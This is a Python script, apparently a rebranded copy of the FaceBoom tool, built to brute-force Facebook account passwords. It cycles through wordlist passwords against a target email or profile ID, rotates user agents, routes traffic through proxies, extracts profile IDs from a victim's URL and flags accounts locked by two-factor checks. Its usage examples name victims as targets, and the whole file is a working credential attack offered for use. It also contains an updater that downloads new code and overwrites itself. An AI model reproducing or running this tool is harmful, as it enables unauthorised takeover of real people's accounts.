#!/usr/bin/python
import socket
import sys
import os
import re
import random
import optparse
import time
import requests
import mechanize
import http.client as httplib

# COLORS
wi = "\033[1;37m"  # White
rd = "\033[1;31m"  # Red
gr = "\033[1;32m"  # Green
yl = "\033[1;33m"  # Yellow

# Clear the terminal screen
os.system("cls" if os.name == "nt" else "clear")


def write(text):
    sys.stdout.write(text)
    sys.stdout.flush()


class FaceBoom:
    def __init__(self):
        self.useProxy = None
        self.br = mechanize.Browser()
        self.br.set_handle_robots(False)
        self.br._factory.is_html = True
        self.br.addheaders = [
            ('User-agent', random.choice([
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.54 Safari/535.2',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.12 Safari/535.11',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15',
                'Mozilla/5.0 (X11; Linux x86_64; rv:17.0) Gecko/20121202 Firefox/17.0 Iceweasel/17.0.1'
            ]))
        ]

    @staticmethod
    def check_proxy(proxy):
        proxies = {'https': "https://" + proxy, 'http': "http://" + proxy}
        proxy_ip = proxy.split(":")[0]
        try:
            r = requests.get('https://www.wikipedia.org', proxies=proxies, timeout=5)
            if proxy_ip == r.headers['X-Client-IP']:
                return True
            return False
        except Exception:
            return False

    @staticmethod
    def cnet():
        try:
            socket.create_connection((socket.gethostbyname("www.google.com"), 80), 2)
            return True
        except socket.error:
            pass
        return False

    def get_profile_id(self, target_profile):
        try:
            print(gr + "\n[" + wi + "*" + gr + "] Getting target Profile Id... please wait" + wi)
            con = requests.get(target_profile).text
            profile_id = None

            # Try to find the profile ID using different patterns
            patterns = [
                r'fb://profile/(?P<id>\d+)',
                r'\"entity_id\":\"(?P<id>\d+)\"',
                r'\"userID\":\"(?P<id>\d+)\"',
            ]

            for pattern in patterns:
                match = re.search(pattern, con)
                if match:
                    profile_id = match.group('id')
                    break

            if profile_id:
                print(wi + "\n[" + gr + "+" + wi + "]" + gr + " Target Profile" + wi + " ID: " + yl + profile_id + wi)
            else:
                print(rd + "[!] Error: Unable to extract profile ID from the provided URL" + wi)
                sys.exit(1)
        except Exception as e:
            print(rd + "[!] Error: Please check your victim's profile URL" + wi)
            print(rd + "Error details: " + str(e))
            sys.exit(1)

    def login(self, target, password):
        try:
            self.br.open("https://facebook.com")
            self.br.select_form(nr=0)
            self.br.form['email'] = target
            self.br.form['pass'] = password
            self.br.method = "POST"
            if b'home_icon' in self.br.submit().get_data():
                return 1
            elif "checkpoint" in self.br.geturl():
                return 2
            return 0
        except (KeyboardInterrupt, EOFError):
            print(rd + "\n[" + yl + "!" + rd + "]" + yl + " Aborting" + rd + "..." + wi)
            time.sleep(1.5)
            sys.exit(1)
        except Exception as e:
            print(rd + " Error: " + yl + str(e) + wi + "\n")
            time.sleep(0.60)

    def banner(self, target, wordlist, single_passwd):
        proxystatus = (
            gr + self.useProxy + wi + "[" + gr + "ON" + wi + "]" if self.useProxy else yl + "[" + rd + "OFF" + yl + "]"
        )
        print(
            gr + """
==================================
[---]    """ + wi + """Sphinxella's AI""" + gr + """     [---]
==================================
[---]  """ + wi + """BruteForce Facebook  """ + gr + """ [---]
==================================
[---]         """ + yl + """CONFIG""" + gr + """         [---]
==================================
[>] Target      :> """ + wi + target + gr + """
{}""".format(
                "[>] Wordlist    :> " + yl + str(wordlist) if not single_passwd else "[>] Password    :> " + yl + str(
                    single_passwd
                )
            )
            + gr + """
[>] ProxyStatus :> """ + str(proxystatus) + wi
        )
        if not single_passwd:
            print(
                gr
                + """\
=================================="""
                + wi + """
[~] """ + yl + """Brute""" + rd + """ ForceATTACK: """ + gr + """Enabled """ + wi + """[~]"""
                + gr + """
==================================\n"""
                + wi
            )
        else:
            print("\n")

    @staticmethod
    def update_faceboom():
        version_path = "core" + os.sep + "version.txt"
        if not os.path.isfile(version_path):
            print(rd + "[!] Error: Unable to check for updates. Please re-clone the script to fix this problem" + wi)
            sys.exit(1)

        write("[~] Checking for updates...\n")
        conn = httplib.HTTPSConnection("raw.githubusercontent.com")
        conn.request("GET", "/Oseid/FaceBoom/master/core/version.txt")
        repo_version = conn.getresponse().read().strip().decode()

        with open(version_path) as vf:
            current_version = vf.read().strip()

        if repo_version == current_version:
            write("  [*] The script is up to date!\n")
        else:
            print("  [+] An update has been found ::: Updating... ")
            conn.request("GET", "/Oseid/FaceBoom/master/faceboom.py")
            new_code = conn.getresponse().read().strip().decode()

            with open("faceboom.py", "w") as faceboom_script:
                faceboom_script.write(new_code)

            with open(version_path, "w") as ver:
                ver.write(repo_version)

            write("  [+] Successfully updated :)\n")


def main():
    parse = optparse.OptionParser(
        wi + """
Usage: python ./sphinxella.py [OPTIONS...]
https://github.com/LOLsphinx/sphinxella
Iloveyou xella!!!

Examples:
        |
     |--------
     | python sphinxella.py -t Victim@gmail.com -w /usr/share/wordlists/rockyou.txt
     |--------
     | python sphinxella.py -t 100001013078780 -w C:\\Users\\Me\\Desktop\\wordlist.txt
     |--------
     | python sphinxella.py -t Victim@hotmail.com -w D:\\wordlist.txt -p 144.217.101.245:3129
     |--------
     | python sphinxella.py -t Victim@gmail.com -s 1234567
     |--------
     | python sphinxella.py -g https://www.facebook.com/Victim_Profile
     |--------
"""
    )

    parse.add_option("-t", "--target", "-T", "--TARGET", dest="target", type="string", help="Specify Target Email or ID")
    parse.add_option(
        "-w", "--wordlist", "-W", "--WORDLIST", dest="wordlist", type="string", help="Specify Wordlist File "
    )
    parse.add_option(
        "-s", "--single", "--S", "--SINGLE", dest="single", type="string", help="Specify Single Password To Check it"
    )
    parse.add_option("-p", "-P", "--proxy", "--PROXY", dest="proxy", type="string", help="Specify HTTP/S Proxy to be used")
    parse.add_option(
        "-g", "-G", "--getid", "--GETID", dest="url", type="string", help="Specify TARGET FACEBOOK PROFILE URL to get his ID"
    )
    parse.add_option("-u", "-U", "--update", "--UPDATE", dest="update", action="store_true", default=False)

    options, _ = parse.parse_args()
    faceboom = FaceBoom()
    target = options.target
    wordlist = options.wordlist
    single_passwd = options.single
    proxy = options.proxy
    target_profile = options.url
    update = options.update
    opts = [target, wordlist, single_passwd, proxy, target_profile, update]

    if any(opt for opt in opts):
        if not faceboom.cnet():
            print(rd + "[!] Error: Please Check Your Internet Connection" + wi)
            sys.exit(1)

    if update:
        faceboom.update_faceboom()
        sys.exit(1)
    elif target_profile:
        faceboom.get_profile_id(target_profile)
        sys.exit(1)
    elif wordlist or single_passwd:
        if wordlist:
            if not os.path.isfile(wordlist):
                print(rd + "[!] Error: Please check Your Wordlist Path" + wi)
                sys.exit(1)

        if single_passwd:
            if len(single_passwd.strip()) < 6:
                print(rd + "[!] Error: Invalid Password" + wi)
                print("[!] Password must be at least '6' characters long")
                sys.exit(1)

        if proxy:
            if proxy.count(".") != 3:
                print(rd + "[!] Error: Invalid IPv4 [" + rd + str(proxy) + yl + "]" + wi)
                sys.exit(1)

            print(
                wi
                + "["
                + yl
                + "~"
                + wi
                + "] Connecting To "
                + wi
                + "Proxy["
                + "\033[1;33m {} \033[1;37m]...".format(proxy if not ":" in proxy else proxy.split(":")[0])
            )
            final_proxy = proxy + ":8080" if not ":" in proxy else proxy

            if faceboom.check_proxy(final_proxy):
                faceboom.useProxy = final_proxy
                faceboom.br.set_proxies({"https": faceboom.useProxy, "http": faceboom.useProxy})
                print(wi + "[" + gr + "Connected" + wi + "]")
            else:
                print(rd + "[!] Error: Connection Failed" + wi)
                print(rd + "[!] Unable to connect to Proxy[" + rd + str(proxy) + yl + "]" + wi)
                sys.exit(1)

        faceboom.banner(target, wordlist, single_passwd)
        loop, passwords = (
            1,
            open(wordlist, encoding="ISO-8859-1").readlines(),
        ) if not single_passwd else ("~", [single_passwd])
        for passwd in passwords:
            passwd = passwd.strip()
            if len(passwd) < 6:
                continue
            write(wi + "[" + yl + str(loop) + wi + "] Trying Password[ {" + yl + str(passwd) + wi + "} ]")
            ret_code = faceboom.login(target, passwd)
            if ret_code:
                sys.stdout.write(wi + " ==> OMG Sphinxella Says Login" + gr + " Success\n")
                print(wi + "=" * (23 + len(passwd)))
                print(wi + "[" + gr + "+" + wi + "] Password [ " + gr + passwd + wi + " ]" + gr + " Is Correct :)")
                print(wi + "=" * (23 + len(passwd)))
                if ret_code == 2:
                    print(
                        wi
                        + "["
                        + yl
                        + "!"
                        + wi
                        + "]"
                        + yl
                        + " Warning: This account uses ("
                        + rd
                        + "2F Authentication"
                        + yl
                        + "):"
                        + rd
                        + " It's Locked"
                        + yl
                        + " !!!"
                    )
                break
            else:
                sys.stdout.write(yl + " ==> Sphinxella says login" + rd + " failed\n")
                loop = loop + 1 if not single_passwd else "~"
        else:
            if single_passwd:
                print(
                    yl
                    + "\n["
                    + rd
                    + "!"
                    + yl
                    + "] Sorry: "
                    + wi
                    + "The Password[ "
                    + yl
                    + passwd
                    + wi
                    + " ] Is Not Correct"
                    + rd
                    + ":("
                    + yl
                    + "!"
                    + wi
                )
                print(gr + "[" + yl + "!" + gr + "]" + yl + " Please Try Another password or Wordlist " + gr + ":)" + wi)
            else:
                print(
                    yl
                    + "\n["
                    + rd
                    + "!"
                    + yl
                    + "] Sorry: "
                    + wi
                    + "I Can't Find The Correct Password In [ "
                    + yl
                    + wordlist
                    + wi
                    + " ] "
                    + rd
                    + ":("
                    + yl
                    + "!"
                    + wi
                )
                print(gr + "[" + yl + "!" + gr + "]" + yl + " Please Try Another Wordlist. " + gr + ":)" + wi)
        sys.exit(1)
    else:
        print(parse.usage)
        sys.exit(1)


if __name__ == "__main__":
    main()
